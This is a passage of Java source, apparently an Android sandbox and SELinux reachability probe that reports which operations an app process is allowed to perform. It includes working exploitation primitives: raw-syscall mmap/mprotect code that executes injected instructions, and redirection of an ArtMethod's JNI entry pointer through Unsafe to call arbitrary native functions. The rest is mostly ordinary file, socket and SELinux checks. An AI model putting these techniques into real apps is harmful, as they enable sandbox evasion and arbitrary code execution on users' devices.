                    emit(o, "memexec: mmap RWX", r == 0x1337 ? 1 : 0, "granted W+X @0x" + Long.toHexString(p) + ", executed -> 0x" + Long.toHexString(r));
                }
                return;
            }
            emit(o, "memexec: mmap RWX", 0, "denied errno=" + errName((int) (-p)));
            bc("mmap RW");
            long q = sc7(222, 0, len, 3, 0x22, -1, 0);                          // mmap anon RW
            if (!(q > 0 && (q & 0xfffL) == 0)) { na(o, "memexec: mmap RW+mprotect X", "RW mmap errno=" + errName((int) (-q))); return; }
            pI(q, SC_MOVZ); pI(q + 4, SC_RET);
            bc("mprotect +X");
            long mp = sc7(226, q, len, 5, 0, 0, 0);                             // mprotect R|X
            if (mp != 0) { emit(o, "memexec: mmap RW+mprotect X", 0, "mprotect +X denied errno=" + errName((int) (-mp))); sc7(215, q, len, 0, 0, 0, 0); return; }
            if (!execute) { emit(o, "memexec: mmap RW+mprotect X", 1, "mprotect +X granted (exec test app-domain only)"); sc7(215, q, len, 0, 0, 0, 0); return; }
            sc7(283, 64, 0, 0, 0, 0, 0); sc7(283, 32, 0, 0, 0, 0, 0);
            bc("exec RW+X");
            long r = callAt(q);
            sc7(215, q, len, 0, 0, 0, 0);
            emit(o, "memexec: mmap RW+mprotect X", r == 0x1337 ? 1 : 0, "mprotect +X ok, executed -> 0x" + Long.toHexString(r));
        } catch (Throwable t) { na(o, "memexec bypass", detail(t)); }
    }

    /** Point jniHook's JNI entry (dstArt+16) at target's registered JNI function
     *  (read from target's ArtMethod+16), call jniHook() so the generic-JNI
     *  trampoline invokes it, restore, and check the result against `expect`. */
    private static void callVia(StringBuilder o, String row, Object u,
            java.lang.reflect.Method uGetLong, java.lang.reflect.Method uPutLong,
            java.lang.reflect.Field am, long dstArt, long saved,
            java.lang.reflect.Method target, long expect) {
        try {
            long fn = (Long) uGetLong.invoke(u, am.getLong(target) + 16);   // target's JNI fn pointer
            long r;
            uPutLong.invoke(u, dstArt + 16, fn);
            try { r = jniHook(); } finally { uPutLong.invoke(u, dstArt + 16, saved); }
            emit(o, row, r == expect ? 1 : 0,
                    "entry->0x" + Long.toHexString(fn) + " ran in-process, returned " + r + " (Os=" + expect + ")");
        } catch (Throwable t) { na(o, row, detail(t)); }
    }

    private static void le16(byte[] b, int off, int v) { b[off] = (byte) v; b[off + 1] = (byte) (v >> 8); }
    private static void le32(byte[] b, int off, int v) { b[off] = (byte) v; b[off + 1] = (byte) (v >> 8); b[off + 2] = (byte) (v >> 16); b[off + 3] = (byte) (v >> 24); }
    /** The raw int fd behind a FileDescriptor (FileDescriptor.getInt$, hidden). */
    private static int fdInt(FileDescriptor fd) throws Throwable {
        return (Integer) FileDescriptor.class.getMethod("getInt$").invoke(fd);
    }
    /** Unwrap a reflective throwable to the errno/name that actually settles the row. */
    private static String detail(Throwable t) {
        if (t instanceof java.lang.reflect.InvocationTargetException && t.getCause() != null) t = t.getCause();
        if (t instanceof ErrnoException) return "errno=" + OsConstants.errnoName(((ErrnoException) t).errno);
        return "unresolved (" + t.getClass().getSimpleName() + ")";
    }

    private static void na(StringBuilder o, String name, String why) { emit(o, name, -1, why); }

    private static void openNamed(StringBuilder o, String name, String path, int flags) {
        FileDescriptor fd = null;
        try { fd = Os.open(path, flags, 0); emit(o, name, 1, "opened"); }
        catch (ErrnoException e) { emit(o, name, e.errno == OsConstants.EACCES || e.errno == OsConstants.ENOENT ? 0 : -1, "errno=" + OsConstants.errnoName(e.errno)); }
        catch (Throwable t) { emit(o, name, -1, t.getClass().getSimpleName()); }
        finally { if (fd != null) try { Os.close(fd); } catch (Throwable ignored) {} }
    }

    private static int flag(String s) {
        return s.equals("rw") ? OsConstants.O_RDWR : s.equals("w") ? OsConstants.O_WRONLY : OsConstants.O_RDONLY;
    }

    private static void socket(StringBuilder o, String name, int domain, int type, int protocol) {
        FileDescriptor fd = null;
        try { fd = Os.socket(domain, type, protocol); emit(o, name, 1, "created"); }
        catch (ErrnoException e) { emit(o, name, e.errno == OsConstants.EACCES ? 0 : -1, "errno=" + OsConstants.errnoName(e.errno)); }
        catch (Throwable t) { emit(o, name, -1, t.getClass().getSimpleName()); }
        finally { if (fd != null) try { Os.close(fd); } catch (Throwable ignored) {} }
    }

    private static void open(StringBuilder o, String path, int flags) {
        FileDescriptor fd = null;
        try { fd = Os.open(path, flags, 0); emit(o, path, 1, "opened"); }
        catch (ErrnoException e) { emit(o, path, e.errno == OsConstants.EACCES ? 0 : -1, "errno=" + OsConstants.errnoName(e.errno)); }
        catch (Throwable t) { emit(o, path, -1, t.getClass().getSimpleName()); }
        finally { if (fd != null) try { Os.close(fd); } catch (Throwable ignored) {} }
    }

    /** /sys/fs/selinux/context validates a context iff its type is in the policy. */
    private static void validate(StringBuilder o, String name, String context) {
        FileDescriptor fd = null;
        try {
            fd = Os.open("/sys/fs/selinux/context", OsConstants.O_RDWR, 0);
            byte[] b = (context + "\0").getBytes();
            Os.write(fd, b, 0, b.length);
            emit(o, name, 1, "context valid");
        } catch (ErrnoException e) {
            emit(o, name, 0, "errno=" + OsConstants.errnoName(e.errno));
        } catch (Throwable t) { emit(o, name, -1, t.getClass().getSimpleName()); }
        finally { if (fd != null) try { Os.close(fd); } catch (Throwable ignored) {} }
    }

    /** compute_av over /sys/fs/selinux/access (see the native probe for the protocol). */
    private static void av(StringBuilder o, String name, String scon, String tcon, String cls, String perm) {
        try {
            int ci = readInt("/sys/fs/selinux/class/" + cls + "/index");
            int pb = readInt("/sys/fs/selinux/class/" + cls + "/perms/" + perm);
            if (ci < 0 || pb < 0) { emit(o, name, -1, "selinuxfs class table unreadable"); return; }
            int mask = 1 << (pb - 1);
            FileDescriptor fd = Os.open("/sys/fs/selinux/access", OsConstants.O_RDWR, 0);
            try {
                String q = scon + " " + tcon + " " + ci + " " + Integer.toHexString(mask);
                byte[] b = q.getBytes();
                Os.write(fd, b, 0, b.length);
                Os.lseek(fd, 0, OsConstants.SEEK_SET);
                byte[] r = new byte[256];
                int n = Os.read(fd, r, 0, r.length);
                int allowed = n > 0 ? (int) Long.parseLong(new String(r, 0, n).trim().split("\\s+")[0], 16) : 0;
                boolean ok = (allowed & mask) != 0;
                emit(o, name, ok ? 1 : 0, ok ? "allow" : "deny");
            } finally { Os.close(fd); }
        } catch (ErrnoException e) { emit(o, name, -1, "compute_av denied errno=" + OsConstants.errnoName(e.errno)); }
        catch (Throwable t) { emit(o, name, -1, t.getClass().getSimpleName()); }
    }

    private static int readInt(String path) {
        try (RandomAccessFile f = new RandomAccessFile(path, "r")) {
            byte[] b = new byte[32]; int n = f.read(b);
            return n <= 0 ? -1 : Integer.parseInt(new String(b, 0, n).trim());
        } catch (Throwable t) { return -1; }
    }

    static void emit(StringBuilder o, String name, int res, String detail) {
        String v = res == 2 ? "INFO     " : (res > 0 ? "REACHABLE" : (res == 0 ? "denied   " : "n/a      "));
        o.append(String.format("%-28s %s  %s\n", name, v, detail));
    }

    private static String ctx() {
        try (RandomAccessFile f = new RandomAccessFile("/proc/self/attr/current", "r")) {
            byte[] b = new byte[128]; int n = f.read(b);
            return n <= 0 ? "?" : new String(b, 0, n).trim();
        } catch (Throwable t) { return "?"; }
    }
}
